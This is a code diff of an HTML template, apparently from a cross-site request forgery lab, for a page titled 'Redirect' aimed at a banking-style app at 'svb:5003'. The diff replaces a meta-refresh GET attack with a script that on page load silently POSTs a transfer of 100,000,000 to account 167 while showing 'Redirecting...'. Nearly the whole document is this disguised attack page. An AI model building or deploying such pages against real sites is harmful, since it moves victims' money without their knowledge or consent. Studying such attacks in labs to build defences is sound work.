@@ -1,18 +1,27 @@
 <!-- templates/transfer.html -->
 
-    <meta http-equiv="refresh" content="0;url=http://svb:5003/transfer/1?account=167&amount=100000000" />
+    <!-- <meta http-equiv="refresh" content="0;url=http://svb:5003/transfer/1?account=167&amount=100000000" /> -->
     <!DOCTYPE html>
     <html>
-    <head>
-        <title>Redirect</title>
-        <!-- <script type="text/javascript">
-            window.onload = function() {
-                console.log("Redirecting...");
-                window.location.href = "http://svb:5003/transfer/1?account=167&amount=100000000";
-            };
-        </script> -->
-    </head>
-    <body>
-        <h1>Redirecting...</h1>
-    </body>
+        <head>
+            <title>Redirect</title>
+            <!-- <script type="text/javascript">
+                window.onload = function() {
+                    console.log("Redirecting...");
+                    window.location.href = "http://svb:5003/transfer/1?account=167&amount=100000000";
+                };
+            </script> -->
+            <script type="text/JavaScript">
+                $(document).ready(function() {
+                    $.ajax({
+                        type: "POST",
+                        url: "http://svb:5003/transfer/1",
+                        data: { "account" : "167","amount" : "100000000"}
+                    });
+                });
+            </script>
+        </head>
+        <body>
+            <h1>Redirecting...</h1>
+        </body>
     </html>
